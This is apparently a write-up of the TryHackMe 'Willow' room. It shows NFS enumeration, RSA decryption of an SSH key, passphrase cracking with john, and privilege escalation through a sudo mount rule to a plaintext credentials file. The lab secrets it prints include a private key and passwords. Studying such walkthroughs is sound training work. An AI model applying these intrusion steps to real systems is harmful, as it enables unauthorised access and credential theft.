# Willow

---

Platform: Tryhackme

Difficulty: Medium

Date: 09/07/2025

Status: Rooted

---

Nmap scan results:

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.181.156 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 09:09 EDT
Nmap scan report for 10.10.181.156
Host is up (0.18s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Recovery Page
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34346/udp   mountd
|   100005  1,2,3      47830/udp6  mountd
|   100005  1,2,3      50480/tcp6  mountd
|   100005  1,2,3      54509/tcp   mountd
|   100021  1,3,4      33641/udp6  nlockmgr
|   100021  1,3,4      33926/udp   nlockmgr
|   100021  1,3,4      42361/tcp   nlockmgr
|   100021  1,3,4      60419/tcp6  nlockmgr
|   100024  1          33708/tcp   status
|   100024  1          44553/tcp6  status
|   100024  1          53827/udp6  status
|   100024  1          55001/udp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: OpenSSH 6.7p1 Debian 5 (protocol 2.0)
- Port 80: Apache httpd 2.4.10 ((Debian))
- Port 111: rpcbind 2-4 (RPC #100000) (basically for nfs)
- Port 2049: nfs

---

### Port 80:

<img width="1918" height="708" alt="image" src="https://github.com/user-attachments/assets/46bb829e-4845-4a5b-9e42-ca2f8f0cf4eb" />

I didn’t understand what was this mess?

But, looks like a large hex value, so copied it all from here and put them in online hex decoder, there with the hint given, I understood what was this finally. → Encrypted SSH private key.

<img width="1882" height="958" alt="image 1" src="https://github.com/user-attachments/assets/4e2cb79d-e74e-48f2-85d7-4b22db928d69" />

<aside>
💡

Hint: Hey Willow, here’s your SSH Private Key — you know wehere the decryption is!

</aside>

First of all we get potential username from the hint: Willow

Second thing we get from here is that we have to search for decryption key also, to decrypt that SSH private key.

I searched for decryption key, through directory fuzzing, but didn’t get anything there, moving on to other things like ssh bruteforcing too, because we get potential username, but bad luck there too.

After some hit and trial , i thought let’s check nfs port also.

---

### Port 2049:

We can use the showmount command to check if the target machine is sharing something across the network.

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ showmount -e 10.10.180.173     
Export list for 10.10.180.173:
/var/failsafe *
```

Yes, /var/failsafe directory is mountable , let’s mount that in our machine and have a look at what’s inside it.

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ sudo mount -t nfs4 -o proto=tcp,port=2049 10.10.180.173:/var/failsafe /mnt/willow -vv 
[sudo] password for ghost: 
mount.nfs4: timeout set for Thu Jul 10 05:05:29 2025
mount.nfs4: trying text-based options 'proto=tcp,port=2049,vers=4.2,addr=10.10.180.173,clientaddr=10.17.87.131'
mount.nfs4: mount(2): Protocol not supported
mount.nfs4: trying text-based options 'proto=tcp,port=2049,vers=4,minorversion=1,addr=10.10.180.173,clientaddr=10.17.87.131'          

┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ cd /mnt/willow          
            
┌──(ghost㉿kali)-[/mnt/willow]
└─$ ls -la
total 12
drwxr--r-- 2 nobody nogroup 4096 Jan 30  2020 .
drwxr-xr-x 5 root   root    4096 Jul  9 09:31 ..
-rw-r--r-- 1 root   root      62 Jan 30  2020 rsa_keys

┌──(ghost㉿kali)-[/mnt/willow]
└─$ cat rsa_keys   
Public Key Pair: (23, 37627)
Private Key Pair: (REDACTED, 37627)
```

Ok, these are basically numeric rsa encryption and decryption keys.

---

### RSA Decryption

Now, if you honestly ask me, at that point even after getting those decryption keys, i was not able to decrypt them. Because I didn’t know how to use those decryption keys to decrypt RSA. I didn’t know how it’s encryption and decryption works, what was it’s algorithm and while dealing with any type of cryptographic algorithm, we have to look for what’s happening behind the scenes, it’s not about guessing and copy pasting.

So, the most important step from here is to look at hint given by room author, which was heading towards his blogpost about [RSA encryption](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/). I read that full blog, and then i can say now, i understand what rsa-encryption is and how can I use those keys to decrypt that message. I highly recommend you all to read that blog post especially if you don’t understand what rsa-encryption is.

[RSA Encryption | MuirlandOracle | Blog](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/)

Now, we can come back to our machine, where we left.

So, I wrote a python script to decrypt that message and let’s check if it’s capable of decrypting that private key.

```python
#!/usr/bin/python3
import sys

def decryption(m, d, n):
    for char in m:
        try:
            number = int(char.strip())
            decrypted = pow(number, d, n)
            print(chr(decrypted), end="")
        except ValueError:
            print(f"\n[!] Skipping invalid entry: '{char.strip()}'", file=sys.stderr)
        except OverflowError:
            print(f"\n[!] Decrypted value too large: '{char.strip()}'", file=sys.stderr)
        except Exception as e:
            print(f"\n[!] Unexpected error: {e}", file=sys.stderr)

if len(sys.argv) == 4:
    try:
        with open(sys.argv[1], 'r') as f:
            message = f.read().strip().split()
        d = int(sys.argv[2])
        n = int(sys.argv[3])
        decryption(message, d, n)
    except FileNotFoundError:
        print("[!] File not found.")
    except ValueError:
        print("[!] Invalid key or modulus value.")
else:
    print("Usage: python3 rsa_decryptor.py <file-path> <private-key> <mod>")

```

So, basically what this does -

- Reads a file: sys.argv[1] — expected to contain space-separated encrypted numbers.(Which we get from webserver [remove that hint from there, put only numbers])
- Takes two arguments: d , n .
    
    From that Private key pair: First number is d(private key exponent) and second one is n(modulus).
    
    <img width="1896" height="147" alt="image 2" src="https://github.com/user-attachments/assets/d7a11efe-60b5-4e5b-80a0-c14ed21c7c60" />
    
- Decrypts and print each character using:
    
    ```bash
    number = int(char.strip())
    decrypted = pow(number, d, n)
    print(chr(decrypted), end="")
    ```
    

Let’s let’s run this python script by providing the arguments needed:

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ python3 rsa-decryptor.py message ***** 37627
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
DHEvVNHFGY+Z2jvCQoGb0LOV8cvVTSDXtbNQ5f/Z3bMdN3AhMN3tQmqXTAPuOI1T
BXZ1aDS6x+s6ecKjybMV/dvnohG8+dDrssV4DPyTOLntpeBkqpSNeiM4MdhxTHj1
PCkDWfBXEAEA/hfvE1oWXMNguy3vlvKn8Sk9We5fl+tEBvPjPNSWrEHksq4ZJWSz
JMEyWi/AxTnHDFiO+3m0Eovw41tdreBU2S6QbYsa9OOAiBnDmWn2m0YmAwS0636L
NJ0Ay4L+ixfYZ+F/5oVQbhvDoXnQCO58mNYqqlDVtD/21aj1+RtoYxSX2f/jxCXt
AMF890psZEugk+mhRZZ6HCvDewmBWkghrZeREEmuWAFkQWV/3gVdMpSdteWM7YIQ
MxkyUMs4jmwvA4ktznTVN1kK7VAtkIUa8+UuVUfchKpQQjwpbGgfdMrcJe55tOdk
M7mSP/jAl9bXlpyikMhrsdkVyNpFtmJU8EGJ4v5GlQzUDuySBCiwcZ7x6u3hpDG+
/+5Nf8423Dy/iAhSWAjoZD3BdkLnfbji1g4dNrJnqHnoZaZxvxs0qQEi/NcOEm4e
W0pyDdA8so0zkTTd7gm6WFarM7ywGec5rX08gT5v3dDYbPA46LJVprtA+D3ymeR4
l3xMq6RDfzFIFa6MWS8yCK67p7mPxSfqvC5NDMONQ/fz+7fO3/pjKBYZYLuchpk4
TsH6aY4QbgnEMuA+Errb/uf/5MAhWDMqLBhi42kxaXZ1e3ZMz2penCZFf/nofbLc
-----END RSA PRIVATE KEY-----  
```

And bang!, we decrypted that Private SSH key. Save that in a file named id_rsa in our woking directory and then give it permission 600.

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ chmod 600 id_rsa
```

---

### Shell as Willow

Now, looks like we can ssh into willow’s account with these private key. Let’s check!

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ ssh -i id_rsa willow@10.10.180.173                                                   
The authenticity of host '10.10.180.173 (10.10.180.173)' can't be established.
ED25519 key fingerprint is SHA256:magOpLj2XlET5C4pPvsDHoHa4Po1iJpM2eNFkXQUZ2I.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:21: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.180.173' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

Nope!, this file is password protected, so we can crack them via ssh2john, not a big deal right?

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ ssh2john id_rsa > pass.hash

┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt
......

┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ john pass.hash --show
id_rsa:wildflower
```

Now, as we grabbed that passphrase , let’s again try to log in to willow’s account

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ ssh -i id_rsa willow@10.10.180.173
Enter passphrase for key 'id_rsa': 
sign_and_send_pubkey: no mutual signature supported
willow@10.10.180.173's password: 
```

Why it’s not working, we are providing all things right. I stuck here and searched on google about this problem and found why this is happening?
New versions of OpenSSH **disable `ssh-rsa`** by default due to its known weaknesses (esp. with SHA-1). You can **explicitly allow by using flags: `-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa`**
Try again:

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ ssh -i id_rsa willow@10.10.180.173 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa
Enter passphrase for key 'id_rsa': 

        "O take me in your arms, love
        For keen doth the wind blow
        O take me in your arms, love
        For bitter is my deep woe."
                 -The Willow Tree, English Folksong

willow@willow-tree:~$ id
uid=1000(willow) gid=1000(willow) groups=1000(willow),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)
```

Finally logged in to willow’s account.

Let’s grab willow’s user flag, which was in form of  a .jpg file. We have to download it into our machine and then will be able to see what’s inside it.

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ scp -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa  willow@10.10.180.173:user.jpg .
Enter passphrase for key 'id_rsa': 
user.jpg                                                                                             100%   12KB  15.3KB/s   00:00  
```

<img width="1912" height="770" alt="image 3" src="https://github.com/user-attachments/assets/3d159fad-7098-4fee-9537-f8ddef6d85e8" />

---

### Shell as Root

Let’s check if willow has any sudo privileges.

```bash
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

Definitely, willow can run mount as root, but how can we use mount so that we get root shell or we have to mount any other directory, which we didn’t explored yet.

<aside>
💡

Room hint: Where, on a Linux system, would you first look for unmounted partitions?

</aside>

Ok, it means willow is allowed to mount disks from the `/dev` directory — the default location for unmounted partitions, amongst other things. Let’s check!

<img width="1875" height="369" alt="image 4" src="https://github.com/user-attachments/assets/fc0df3c9-23ef-4e5e-9885-59de519c1aab" />

There’s a hidden_bakup file. Let’s see what it contains.

Mount it and have to look at it.

```python
willow@willow-tree:~$ cd /mnt
willow@willow-tree:/mnt$ ls
creds
```

Before mounting, there is an empty creds named folder inside /mnt that means , we are not the first one using it, someone before us already used it. Let’s mount in it.

```bash
willow@willow-tree:/mnt$ sudo /bin/mount /dev/hidden_backup /mnt/creds
willow@willow-tree:/mnt$ cd creds
willow@willow-tree:/mnt/creds$ ls -la
total 6
drwxr-xr-x 2 root root 1024 Jan 30  2020 .
drwxr-xr-x 3 root root 4096 Jan 30  2020 ..
-rw-r--r-- 1 root root   42 Jan 30  2020 creds.txt
willow@willow-tree:/mnt/creds$ cat creds.txt
root:REDACTED
willow:U0ZZJLGYhNAT2s

```

Here we go! root’s password in plain text. Now, just switch to user root with the help of this password.

```bash
willow@willow-tree:/mnt/creds$ su root
Password: 
root@willow-tree:/mnt/creds# cd /root
root@willow-tree:~# ls -la
total 36
drwx------  5 root root 4096 Jan 30  2020 .
drwxr-xr-x 23 root root 4096 Jan 30  2020 ..
lrwxrwxrwx  1 root root    9 Jan 30  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 Jan 30  2020 .config
drwxr-xr-x  3 root root 4096 Jan 30  2020 .local
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root  139 Jan 30  2020 root.txt
-rw-r--r--  1 root root   74 Jan 30  2020 .selected_editor
drwx------  2 root root 4096 Mar  1  2020 .ssh
```

We are root, but we can’t see root flag here? Then where is the flag?

I tried to find the root flag in whole system with find command but couldn’t find root’s flag.

```bash
root@willow-tree:~# find / -type f -name root.flag 2>/dev/null
root@willow-tree:~# find / -type f -name flag.txt 2>/dev/null
```

Then, I remeber we got user’s flag via a jpg file, so we can search for root.jpg file maybe.

```bash
root@willow-tree:~# find / -type f -name root.jpg 2>/dev/null
```

Bad luck! found nothing.

<aside>
💡

We have a image file user.jpg which contains user flag, what if there’s something more in that image, maybe hidden inside it. Let’s check with steghide.

</aside>

```bash
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ steghide extract -sf user.jpg                                                                                  
Enter passphrase: 
wrote extracted data to "root.txt".
                                                                                                                                       
┌──(ghost㉿kali)-[~/tryhackme/willow]
└─$ cat root.txt 
THM{REDACTED}

```

We find that damn root’s flag now!

---

That’s it for this machine.✅
